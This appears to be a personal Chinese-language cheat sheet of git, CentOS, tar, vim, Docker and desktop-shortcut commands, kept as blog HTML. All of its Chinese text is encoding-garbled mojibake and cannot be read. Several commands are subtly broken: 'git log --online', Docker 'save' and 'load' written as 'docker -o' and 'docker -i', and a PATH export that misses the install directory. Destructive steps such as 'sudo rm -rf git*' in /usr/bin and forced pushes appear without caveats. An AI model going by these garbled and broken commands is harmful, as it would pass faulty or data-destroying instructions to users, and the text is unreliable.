-f</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">åˆ é™¤æŒ‡å®šè·¯å¾„ä¸‹çš„æ²¡æœ‰è¢«trackè¿‡çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶å¤¹å¦‚æœæ˜¯æ–°å»ºçš„ä¹Ÿä¸€èµ·ä¼šåˆ é™¤</span></span><br><span class="line">git clean -f &lt;path&gt;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">åˆ é™¤å½“å‰ç›®å½•ä¸‹æ²¡æœ‰è¢«trackè¿‡çš„æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ï¼Œä¾‹å¦‚æ²¡æœ‰addåˆ°æš‚å­˜åŒºçš„æ–‡ä»¶å’Œæ–‡ä»¶å¤¹</span></span><br><span class="line">git clean -df</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">åˆ é™¤å½“å‰ç›®å½•ä¸‹æ‰€æœ‰æ²¡æœ‰trackè¿‡çš„æ–‡ä»¶. ä¸ç®¡ä»–æ˜¯å¦æ˜¯.gitignoreæ–‡ä»¶é‡Œé¢æŒ‡å®šçš„æ–‡ä»¶å¤¹å’Œæ–‡ä»¶</span></span><br><span class="line">git clean -xf</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">git reset --hardå’Œgit clean -fæ˜¯ä¸€å¯¹å¥½åŸºå‹. ç»“åˆä½¿ç”¨ä»–ä»¬èƒ½è®©ä½ çš„å·¥ä½œç›®å½•å®Œå…¨å›é€€åˆ°æœ€è¿‘ä¸€æ¬¡commitçš„æ—¶å€™</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">git cleanå¯¹äºåˆšç¼–è¯‘è¿‡çš„é¡¹ç›®ä¹Ÿéå¸¸æœ‰ç”¨. å¦‚, ä»–èƒ½è½»æ˜“åˆ é™¤æ‰ç¼–è¯‘åç”Ÿæˆçš„.oå’Œ.exeç­‰æ–‡ä»¶. è¿™ä¸ªåœ¨æ‰“åŒ…è¦å‘å¸ƒä¸€ä¸ªreleaseçš„æ—¶å€™éå¸¸æœ‰ç”¨</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">ä¸‹é¢çš„ä¾‹å­è¦åˆ é™¤æ‰€æœ‰å·¥ä½œç›®å½•ä¸‹é¢çš„ä¿®æ”¹, åŒ…æ‹¬æ–°æ·»åŠ çš„æ–‡ä»¶. å‡è®¾ä½ å·²ç»æäº¤äº†ä¸€äº›å¿«ç…§äº†, è€Œä¸”åšäº†ä¸€äº›æ–°çš„å¼€å‘</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">è¿è¡Œå, å·¥ä½œç›®å½•å’Œç¼“å­˜åŒºå›åˆ°æœ€è¿‘ä¸€æ¬¡commitæ—¶å€™ä¸€æ‘¸ä¸€æ ·çš„çŠ¶æ€ï¼Œgit statusä¼šå‘Šè¯‰ä½ è¿™æ˜¯ä¸€ä¸ªå¹²å‡€çš„å·¥ä½œç›®å½•, åˆæ˜¯ä¸€ä¸ªæ–°çš„å¼€å§‹äº†ï¼</span></span><br><span class="line">git reset --hard &amp;&amp; git clean -df</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">åˆ é™¤å½“å‰commité‡Œçš„.ideaæ–‡ä»¶å¤¹</span></span><br><span class="line">git rm -rf .idea</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">è®¾ç½®git gcå‘¨æœŸ</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">æ˜¯ä¸€ä¸ªè¢«åˆ é™¤çš„æäº¤ä¼šåœ¨åˆ é™¤30å¤©åï¼Œä¸”è¿è¡Œ git gc ä»¥åï¼Œè¢«æ°¸ä¹…ä¸¢å¼ƒ</span></span><br><span class="line">git config gc.pruneexpire &quot;30 days&quot;</span><br><span class="line"><span class="meta"># </span><span class="language-bash">åœ¨è¿™ç§æƒ…å†µä¸‹æäº¤å°†åªåœ¨ä½ æ‰‹å·¥è¿è¡Œ git gc çš„æƒ…å†µä¸‹æ‰æ°¸ä¹…åˆ é™¤ã€‚</span></span><br><span class="line">git config gc.auto 0</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">æ‰¾å›ä¸¢å¤±çš„commit</span></span><br><span class="line">git fsck --lost-found</span><br><span class="line">git show &lt;HASH&gt;</span><br><span class="line">git merge</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">git squashç”¨æ³•</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">å…ˆcheckout masteråˆ†æ”¯å¹¶åšæœ¬åœ°åˆ†æ”¯å’Œè¿œç¨‹ä»“åº“åŒæ­¥</span></span><br><span class="line">git checkout master</span><br><span class="line">git pull</span><br><span class="line"><span class="meta"># </span><span class="language-bash">åˆ‡æ¢åˆ°å¼€å‘åˆ†æ”¯ï¼Œå¹¶æ‰§è¡Œcommitsåˆå¹¶æ“ä½œ</span></span><br><span class="line">git checkout feature/mingwhuang_123123</span><br><span class="line">git rebase -i master</span><br><span class="line"><span class="meta"># </span><span class="language-bash">ä¸­æ­¢abort</span></span><br><span class="line">git rebase --abort</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">ä¸»å¹²å¼€å‘ï¼Œæ¯æ¬¡pullä¹‹å‰æ‰§è¡Œä»¥ä¸‹å‘½ä»¤</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">å…ˆcheckout masteråˆ†æ”¯å¹¶åšæœ¬åœ°åˆ†æ”¯å’Œè¿œç¨‹ä»“åº“åŒæ­¥</span></span><br><span class="line">git checkout master</span><br><span class="line">git pull</span><br><span class="line"><span class="meta"># </span><span class="language-bash">åˆ‡æ¢åˆ°å¼€å‘åˆ†æ”¯ï¼Œå¹¶æ‰§è¡Œrebaseæ“ä½œ</span></span><br><span class="line">git checkout &#123;åˆ†æ”¯å&#125;</span><br><span class="line">git rebase master</span><br><span class="line"><span class="meta"># </span><span class="language-bash">ç„¶åå†å°†å¼€å‘åˆ†æ”¯pushåˆ°è¿œç¨‹ä»“åº“</span></span><br><span class="line">git pull</span><br><span class="line"><span class="meta"># </span><span class="language-bash">å¦‚æœrebaseå‡ºç°é—®é¢˜ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªå‘½ä»¤ä¸­æ­¢rebase</span></span><br><span class="line">git rebase --abort</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">commitè§„èŒƒ</span></span><br><span class="line">featï¼šæ–°åŠŸèƒ½ï¼ˆfeatureï¼‰</span><br><span class="line">fixï¼šä¿®è¡¥bug</span><br><span class="line">docsï¼šæ–‡æ¡£ï¼ˆdocumentationï¼‰</span><br><span class="line">styleï¼š æ ¼å¼ï¼ˆä¸å½±å“ä»£ç è¿è¡Œçš„å˜åŠ¨ï¼‰</span><br><span class="line">refactorï¼šé‡æ„ï¼ˆå³ä¸æ˜¯æ–°å¢åŠŸèƒ½ï¼Œä¹Ÿä¸æ˜¯ä¿®æ”¹bugçš„ä»£ç å˜åŠ¨ï¼‰</span><br><span class="line">testï¼šå¢åŠ æµ‹è¯•</span><br><span class="line">choreï¼šæ„å»ºè¿‡ç¨‹æˆ–è¾…åŠ©å·¥å…·çš„å˜åŠ¨</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">Gitå…¨å±€è®¾ç½®</span></span><br><span class="line">git config --global user.name  &quot;mingwhuang&quot;</span><br><span class="line">git config --global user.email &quot;mingwhuang@tencent.com&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">åˆ é™¤æŒ‡å®šçš„è¿œç¨‹ä»“åº“</span></span><br><span class="line">git remote rm origin</span><br><span class="line"><span class="meta"># </span><span class="language-bash">masteråˆ†æ”¯ä¸èƒ½drop commit, æœ¬åœ°åˆ†æ”¯ä¸Šçš„commitä¹Ÿä¸èƒ½åˆ é™¤ï¼Œä½†æ˜¯ç›´æ¥åˆ æ‰åˆ†æ”¯æ‰€æœ‰çš„commitéƒ½å¤„äºä¸¢å¤±çš„commit</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">masterå‡ºç°äº†åˆ†å‰ï¼Œæ€ä¹ˆå¤„ç†</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">å…ˆæ–°å»ºåˆ†æ”¯å†cherypickï¼Œç„¶åå†å°†åŸæ¥çš„masteræ”¹åï¼Œå†å°†æ–°åˆ†æ”¯push -fä¸Šå»</span></span><br><span class="line">git cherry-pick å¤šä¸ªhashå€¼</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">ç”¨ä¸€æ¬¡æ–°çš„commitæ¥å›æ»šä¹‹å‰çš„commitï¼Œæ­¤æ¬¡æäº¤ä¹‹å‰çš„commitéƒ½ä¼šè¢«ä¿ç•™</span></span><br><span class="line">git revert</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">æ–‡ä»¶è¢«ä¿®æ”¹äº†ï¼Œä½†æœªæ‰§è¡Œgit addæ“ä½œ(working treeå†…æ’¤é”€)</span></span><br><span class="line">git checkout fileName</span><br><span class="line">git checkout .</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">åŒæ—¶å¯¹å¤šä¸ªæ–‡ä»¶æ‰§è¡Œäº†git addæ“ä½œï¼Œä½†æœ¬æ¬¡åªæƒ³æäº¤å…¶ä¸­ä¸€éƒ¨åˆ†æ–‡ä»¶</span></span><br><span class="line">git add *</span><br><span class="line">git status</span><br><span class="line"><span class="meta"># </span><span class="language-bash">å–æ¶ˆæš‚å­˜</span></span><br><span class="line">git reset HEAD</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">æ–‡ä»¶æ‰§è¡Œäº†git addæ“ä½œï¼Œä½†æƒ³æ’¤é”€å¯¹å…¶çš„ä¿®æ”¹ï¼ˆindexå†…å›æ»šï¼‰</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">å–æ¶ˆæš‚å­˜</span></span><br><span class="line">git reset HEAD fileName</span><br><span class="line"><span class="meta"># </span><span class="language-bash">æ’¤é”€ä¿®æ”¹</span></span><br><span class="line">git checkout fileName</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">ä¿®æ”¹çš„æ–‡ä»¶å·²è¢«git commitï¼Œä½†æƒ³å†æ¬¡ä¿®æ”¹ä¸å†äº§ç”Ÿæ–°çš„Commit</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">ä¿®æ”¹æœ€åä¸€æ¬¡æäº¤</span></span><br><span class="line">git add sample.txt</span><br><span class="line">git commit --amend -m&quot;è¯´æ˜&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">å·²åœ¨æœ¬åœ°è¿›è¡Œäº†å¤šæ¬¡git commitæ“ä½œï¼Œç°åœ¨æƒ³æ’¤é”€åˆ°å…¶ä¸­æŸæ¬¡Commit</span></span><br><span class="line">git reset [--hard|soft|mixed|merge|keep] [commit|HEAD]</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">æƒ…å†µä¸€ï¼šæ’¤é”€æŒ‡å®šæ–‡ä»¶åˆ°æŒ‡å®šç‰ˆæœ¬</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">æŸ¥çœ‹æŒ‡å®šæ–‡ä»¶çš„å†å²ç‰ˆæœ¬</span></span><br><span class="line">git log</span><br><span class="line"><span class="meta"># </span><span class="language-bash">å›æ»šåˆ°æŒ‡å®šcommitID</span></span><br><span class="line">git checkout</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">æƒ…å†µäºŒï¼šåˆ é™¤æœ€åä¸€æ¬¡è¿œç¨‹æäº¤</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">æ–¹å¼ä¸€ï¼šä½¿ç”¨revert</span></span><br><span class="line">git revert HEAD</span><br><span class="line">git push origin master</span><br><span class="line"><span class="meta"># </span><span class="language-bash">æ–¹å¼äºŒï¼šä½¿ç”¨reset</span></span><br><span class="line">git reset --hard HEAD^</span><br><span class="line">git push origin master -f</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">äºŒè€…åŒºåˆ«ï¼š</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">revertæ˜¯æ”¾å¼ƒæŒ‡å®šæäº¤çš„ä¿®æ”¹ï¼Œä½†æ˜¯ä¼šç”Ÿæˆä¸€æ¬¡æ–°çš„æäº¤ï¼Œéœ€è¦å¡«å†™æäº¤æ³¨é‡Šï¼Œä»¥å‰çš„å†å²è®°å½•éƒ½åœ¨ï¼›</span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">resetæ˜¯æŒ‡å°†HEADæŒ‡é’ˆæŒ‡åˆ°æŒ‡å®šæäº¤ï¼Œå†å²è®°å½•ä¸­ä¸ä¼šå‡ºç°æ”¾å¼ƒçš„æäº¤è®°å½•ã€‚</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">æƒ…å†µä¸‰ï¼šå›æ»šæŸæ¬¡æäº¤</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">æ‰¾åˆ°è¦å›æ»šçš„commitID</span></span><br><span class="line">git log</span><br><span class="line">git revert commitID</span><br><span class="line"><span class="meta"># </span><span class="language-bash">åˆ é™¤æŸæ¬¡æäº¤</span></span><br><span class="line">git log --online -n5</span><br></pre></td></tr></table></figure>

<h2 id="å¸è½½å¹¶å®‰è£…æ–°ç‰ˆgit"><a href="#å¸è½½å¹¶å®‰è£…æ–°ç‰ˆgit" class="headerlink" title="å¸è½½å¹¶å®‰è£…æ–°ç‰ˆgit"></a>å¸è½½å¹¶å®‰è£…æ–°ç‰ˆgit</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">å¸è½½</span></span><br><span class="line">yum -y remove git</span><br><span class="line">which -a git</span><br><span class="line">cd /usr/bin</span><br><span class="line">sudo rm -rf git*</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cd /usr/local</span><br><span class="line">wget https://github.com/git/git/archive/refs/tags/v2.32.0.tar.gz</span><br><span class="line">tar -zxvf v2.32.0.tar.gz </span><br><span class="line"></span><br><span class="line">yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel gcc perl-ExtUtils-MakeMaker</span><br><span class="line">cd git-2.32.0/</span><br><span class="line">make prefix=/usr/local/git all</span><br><span class="line">make prefix=/usr/local/git install</span><br><span class="line">vi /etc/profile </span><br><span class="line"></span><br><span class="line">export PATH=$PATH:/usr/bin/git/bin</span><br><span class="line">source /etc/profile</span><br><span class="line">git --version</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">http.h:6:23: è‡´å‘½é”™è¯¯ï¼šcurl/curl.hï¼šæ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•</span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">æ‰§è¡Œå³å¯è§£å†³</span></span><br><span class="line">yum -y install curl-devel</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">http-push.c:22:19: è‡´å‘½é”™è¯¯ï¼šexpat.hï¼šæ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•</span></span><br><span class="line">yum install -y  expat-devel</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="Centos-7"><a href="#Centos-7" class="headerlink" title="Centos 7"></a>Centos 7</h1><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install man man-pages </span><br><span class="line">man 2 read</span><br><span class="line">tail -f out.11624</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cd /proc/$$/fd</span><br><span class="line">ll</span><br><span class="line">ls</span><br><span class="line"></span><br><span class="line">yum install strace </span><br><span class="line"><span class="meta"># </span><span class="language-bash">forkfork output</span></span><br><span class="line">strace -ff -o out java SocketBIO</span><br><span class="line">nc localhost 9090</span><br><span class="line">exec 8&lt;&gt; /dev/tcp/www.baidu.com/80</span><br><span class="line">echo -e &quot;GET / HTTP/1.0\n&quot; &gt;&amp; 8</span><br><span class="line">cat 0&lt;&amp; 8</span><br><span class="line">curl www.baidu.com</span><br><span class="line">tcpdump -nn -i eth0 port 80</span><br><span class="line">tcpdump -nn -i eth0 arp or port 80</span><br><span class="line">route -n</span><br><span class="line">arp -d 10.211.55.1 &amp;&amp; curl www.baidu.com</span><br><span class="line">arp -a</span><br><span class="line">ifconfig lo:3. 192.168.88.88</span><br><span class="line">route add -host 192.168.88.88 gw 10.211.55.30</span><br><span class="line">find / -name &#x27;nginx&#x27;</span><br><span class="line">yum list installed | grep docker</span><br><span class="line">ifconfig</span><br><span class="line">touch</span><br><span class="line">vi</span><br><span class="line">mkdir leyou</span><br><span class="line"><span class="meta"># </span><span class="language-bash"> -rå’Œ-fåˆå†™ï¼Œ-rè¡¨ç¤ºé€’å½’åœ°å¤„ç†æ–‡ä»¶ï¼Œå³å¤„ç†è¯¥ç›®å½•åŠå…¶æ‰€æœ‰å­ç›®å½•ä¸‹ç¬¦åˆæ¡ä»¶çš„æ–‡ä»¶ï¼›-fåˆ™æ˜¯æ— æç¤ºå¼ºåˆ¶åˆ é™¤ã€‚</span></span><br><span class="line">rm -rf myzoo</span><br><span class="line">mv myzoo /var/www/myzoo</span><br><span class="line">pwd</span><br><span class="line">rm *</span><br><span class="line">whereis nginx</span><br><span class="line">systemctl reload apache2</span><br><span class="line">vi /etc/hosts</span><br><span class="line">cp -r myzoo /var/www</span><br><span class="line">kill -9 PID</span><br><span class="line">ps -ef|grep java</span><br><span class="line">netstat -apn|grep 5601</span><br><span class="line">netstat -natp</span><br><span class="line">ln -s /var/app/app/jar /etc/init.d/app</span><br><span class="line">chmod u+x app.jar</span><br><span class="line">service app start</span><br><span class="line"></span><br><span class="line">chkconfig servicename on/off</span><br><span class="line"></span><br><span class="line">firewall-cmd --zone=public --add-port=4789/udp --permanent</span><br><span class="line">firewall-cmd --zone=public --add-port=80/tcp --permanent</span><br><span class="line">firewall-cmd --reload</span><br><span class="line"></span><br><span class="line">æŸ¥çœ‹PATHï¼šecho $PATH</span><br><span class="line"></span><br><span class="line">scp /home/888.zip 192.168.1.2:/home/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">top</span><br><span class="line">free -m:çœ‹å†…å­˜å ç”¨</span><br><span class="line">df -h ï¼šçœ‹ç¡¬ç›˜å ç”¨ç‡</span><br></pre></td></tr></table></figure>

<p>taråŠŸèƒ½ï¼šæ–‡ä»¶çš„å‹ç¼©æˆ–è§£å‹</p>
<p>è¯­æ³•ï¼štar å‘½ä»¤</p>
<blockquote>
<p>-c å»ºç«‹ä¸€ä¸ªå‹ç¼©æ–‡ä»¶çš„å‚æ•°æŒ‡ä»¤ï¼ˆcreateï¼‰ â€“å‹ç¼©<br>-x è§£å¼€ä¸€ä¸ªå‹ç¼©æ–‡ä»¶çš„å‚æ•°æŒ‡ä»¤ï¼ˆextractï¼‰ â€“è§£å‹<br>-z æ˜¯å¦éœ€è¦gzipå‹ç¼©<br>-v æ˜¾ç¤ºå‹ç¼©çš„è¿‡ç¨‹ï¼ˆverboseï¼‰<br>-f ä½¿ç”¨æ¡£åï¼Œåœ¨fä¹‹åè¦ç«‹å³æ¥æ¡£åï¼ˆfileï¼‰</p>
</blockquote>
<p>å‹ç¼©ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -zcvf æ–‡ä»¶å å‹ç¼©è·¯å¾„ </span><br></pre></td></tr></table></figure>

<p>è§£å‹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -zxvf æ–‡ä»¶å</span><br></pre></td></tr></table></figure>

<p>ç¤ºä¾‹ï¼š</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -zcvf æ–‡ä»¶å.tar.gz è¦å‹ç¼©æ–‡ä»¶è·¯å¾„</span><br></pre></td></tr></table></figure>

<p>è§£å‹ç¼©</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -zxvf è¦è§£å‹çš„æ–‡ä»¶.tar.gz </span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå‘½ä»¤æ˜¯è§£å‹åˆ°å½“å‰æ–‡ä»¶å¤¹</p>
<p>è§£å‹åˆ°æŒ‡å®šç›®å½•ä¸­ï¼ˆè¯¥ç›®å½•éœ€è¦å­˜åœ¨ï¼‰éœ€è¦æ·»åŠ -Cå‚æ•°</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -zxvf è¦è§£å‹çš„æ–‡ä»¶.tar.gz -C æŒ‡å®šç›®å½•è·¯å¾„</span><br></pre></td></tr></table></figure>

<h2 id="vi-x2F-vim"><a href="#vi-x2F-vim" class="headerlink" title="vi&#x2F;vim"></a>vi&#x2F;vim</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">:<span class="built_in">set</span> nu <span class="comment">#æ˜¾ç¤ºè¡Œå·</span></span><br><span class="line">:<span class="built_in">set</span> nonu</span><br><span class="line"></span><br><span class="line">/bind.*6379 <span class="comment">#å¾€ä¸‹</span></span><br><span class="line">?<span class="built_in">bind</span>.*6379 <span class="comment">#å¾€ä¸Š</span></span><br><span class="line">n <span class="comment">#ä¸‹ä¸€ä¸ª</span></span><br><span class="line">N <span class="comment">#ä¸Šä¸€ä¸ª</span></span><br><span class="line"></span><br><span class="line">x,X <span class="comment">#xå‘ååˆ é™¤ä¸€ä¸ªå­—ç¬¦,Xå‘å‰åˆ é™¤ä¸€ä¸ªå­—ç¬¦</span></span><br><span class="line">ndd <span class="comment">#nä¸ºæ•°å­—åˆ é™¤å…‰æ ‡å‘ä¸‹nè¡Œ</span></span><br><span class="line">yy <span class="comment">#å¤åˆ¶æ¸¸æ ‡æ‰€åœ¨çš„é‚£ä¸€è¡Œ</span></span><br><span class="line">nyy <span class="comment">#nä¸ºæ•°å­—å¤åˆ¶æ¸¸æ ‡æ‰€åœ¨çš„å‘ä¸‹nè¡Œ</span></span><br><span class="line">p,P <span class="comment">#p ä¸ºå°†å·²å¤åˆ¶çš„æ•°æ®åœ¨å…‰æ ‡ä¸‹ä¸€è¡Œè´´ä¸Šï¼ŒP åˆ™ä¸ºè´´åœ¨æ¸¸æ ‡ä¸Šä¸€è¡Œï¼ ä¸¾ä¾‹æ¥è¯´ï¼Œæˆ‘ç›®å‰å…‰æ ‡åœ¨ç¬¬ 20 è¡Œï¼Œä¸”å·²ç»å¤åˆ¶äº† 10 è¡Œæ•°æ®ã€‚åˆ™æŒ‰ä¸‹ p åï¼Œ é‚£ 10 è¡Œæ•°æ®ä¼šè´´åœ¨åŸæœ¬çš„ 20 è¡Œä¹‹åï¼Œäº¦å³ç”± 21 è¡Œå¼€å§‹è´´ã€‚ä½†å¦‚æœæ˜¯æŒ‰ä¸‹ P å‘¢ï¼Ÿ é‚£ä¹ˆåŸæœ¬çš„ç¬¬ 20 è¡Œä¼šè¢«æ¨åˆ°å˜æˆ 30 è¡Œã€‚ (å¸¸ç”¨)</span></span><br><span class="line">u <span class="comment"># å¤åŸä¸Šä¸€ä¸ªåŠ¨ä½œ</span></span><br><span class="line">ctrl + r <span class="comment"># é‡åšä¸Šä¸€ä¸ªåŠ¨ä½œ</span></span><br><span class="line">. <span class="comment">#ä¸è¦æ€€ç–‘ï¼è¿™å°±æ˜¯å°æ•°ç‚¹ï¼æ„æ€æ˜¯é‡å¤å‰ä¸€ä¸ªåŠ¨ä½œçš„æ„æ€ã€‚ å¦‚æœä½ æƒ³è¦é‡å¤åˆ é™¤ã€é‡å¤è´´ä¸Šç­‰ç­‰åŠ¨ä½œï¼ŒæŒ‰ä¸‹å°æ•°ç‚¹ã€.ã€å°±å¥½äº†ï¼ (å¸¸ç”¨)</span></span><br></pre></td></tr></table></figure>

<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211845759.gif" alt="img"></p>
<h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><p>é€€å‡ºdockå®¹å™¨: ctrl + D æˆ–è€…è¾“å…¥exit</p>
<p>æŸ¥çœ‹æœ¬åœ°é•œåƒ: docker images</p>
<p>æŸ¥çœ‹å®¹å™¨è¿è¡Œæƒ…å†µ: docker ps</p>
<p>é‡å¯å®¹å™¨å†…çš„æœåŠ¡: docker restart nginx</p>
<p>æŸ¥dockeræ’ä»¶ä½ç½®: docker volume inspect es-plugins</p>
<p>æŸ¥çœ‹dockerå¯åŠ¨çŠ¶æ€: systemctl status docker</p>
<p>å¯åŠ¨dockeræœåŠ¡: systemctl start docker</p>
<p>åœæ­¢dockeræœåŠ¡: systemctl stop docker</p>
<p>é‡å¯dockeræœåŠ¡: systemctl restart docker</p>
<p>æŸ¥çœ‹å¸®åŠ©: docker â€“help</p>
<p>åŠ å…¥å¼€æœºè‡ªå¯: systemctl enable docker</p>
<p>æ˜¾ç¤ºæ‰€æœ‰å®¹å™¨åŒ…æ‹¬åœæ­¢çš„: docker ps -a</p>
<p>å°†å¤šä¸ªé•œåƒæ‰“åŒ…: docker -o xxx.tar é•œåƒ1 é•œåƒ2</p>
<p>åŠ è½½é•œåƒ: docker -i xxx.save.tar</p>
<h1 id="MACOS"><a href="#MACOS" class="headerlink" title="MACOS"></a>MACOS</h1><p>æŸ¥ipï¼šifconfig | grep â€œinet â€œ | grep -v 127.0.0.1</p>
<p>æ˜¾ç¤ºéšè—æ–‡ä»¶å¤¹: shift + command + .</p>
<p>åˆ‡æ¢æ¡Œé¢:control + å·¦å’Œå³å’Œä¸Šå’Œä¸‹</p>
<h2 id="idea"><a href="#idea" class="headerlink" title="idea"></a>idea</h2><p>è·³å‡ºå½“å‰ä»£ç å—ï¼šshift + command + enter </p>
<p>åˆ‡æ¢è‡³ä¸Šä¸€ä¸ªå…‰æ ‡: option + command + å·¦å³</p>
<p>é‡æ„: refactor</p>
<p>æ ¼å¼åŒ–ä»£ç : option + command + L</p>
<p>ç±»å’Œæ–‡ä»¶æŸ¥è¯¢: shift + shift</p>
<p>å…¨éƒ¨å†…å®¹æŸ¥è¯¢: command + shift + R </p>
<p>å½“å‰æ–‡ä»¶æŸ¥è¯¢: command + f</p>
<p>å¤åˆ¶å½“å‰è¡Œ: command + d</p>
<p>æ˜¾ç¤ºç±»çš„ç»§æ‰¿å›¾: crtl + alt + U</p>
<p>è°ƒå‡ºideaå¯„å­˜å™¨ä¿å­˜çš„æœ€è¿‘å¤åˆ¶çš„Nä»½å†…å®¹,å¯é€‰æ‹©æ€§ç²˜è´´: shift + comamnd + v</p>
<p>è¡¥å…¨å½“å‰è¡Œ: shift+cmd + enter</p>
<p>å°†ä»£ç æ®µå°è£…æˆå‡½æ•°: option + command + m (æŒ‰ä¸€æ¬¡å°±é»˜è®¤ç”Ÿæˆ,æŒ‰ä¸¤æ¬¡ä¸ºè‡ªå®šä¹‰ç”Ÿæˆ)</p>
<p>forå¾ªç¯å¿«æ·æ–¹å¼: 100.for</p>
<p>å¿«æ·trycatch: option + command + T</p>
<p>if a &#x3D;&#x3D; null : a.null</p>
<p>if (flag) : flag.if</p>
<p>while (flag): flag.while</p>
<p>Rename: shift+fn+F6</p>
<p>æ’ä»¶</p>
<ul>
<li>ä¸€é”®ç”Ÿæˆsetæ–¹æ³•çš„æ’ä»¶ï¼šgenerateallsetter option+enter</li>
</ul>
<h2 id="Typora"><a href="#Typora" class="headerlink" title="Typora"></a>Typora</h2><p>å¼€å‘è€…å·¥å…·: Shift + F12</p>
<p>æ¸…é™¤æ ¼å¼: command + \</p>
<p>è·³å‡ºåˆ—è¡¨æˆ–è€…å¼•ç”¨: caps lock + enter</p>
<p>è·³å‡ºä»£ç å—: command + enter</p>
<p>æºä»£ç æ¨¡å¼: command + &#x2F;</p>
<p>åŠ å…¥ç›®å½•: [TOC]</p>
<p>æ–‡æ¡£æ ‘æ¨¡å¼: control+ command +3</p>
<p>å¤§çº²æ¨¡å¼: control + command + 1</p>
<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><p>åˆ‡æ¢è™šæ‹Ÿæ¡Œé¢: win + Tab</p>
<p>æ–°å»ºè™šæ‹Ÿæ¡Œé¢: win + ctrl + d</p>
<p>å…³é—­è™šæ‹Ÿæ¡Œé¢: win + ctrl + F4</p>
<p>æ˜¾ç¤ºæ¡Œé¢&#x2F;è¿”å›å½“å‰é¡µé¢: win + d</p>
<p>æ‰“å¼€æ–‡ä»¶èµ„æºç®¡ç†å™¨: win + e</p>
<p>æ‰“å¼€è®¾ç½®: win + i</p>
<p>é”å±: win + L</p>
<p>æ‰“å¼€è¿è¡Œçª—å£: win + r</p>
<p>å¿«æ·æ‰“å°: win + p</p>
<p>ä»»åŠ¡åˆ‡æ¢: alt + tap</p>
<p>æµè§ˆå™¨å†…çª—å£åˆ‡æ¢: ctrl + tap</p>
<p>å…³é—­å½“å‰çª—å£: alt + f4 &#x2F; åŒå‡»çª—å£å·¦ä¸Šæ–¹</p>
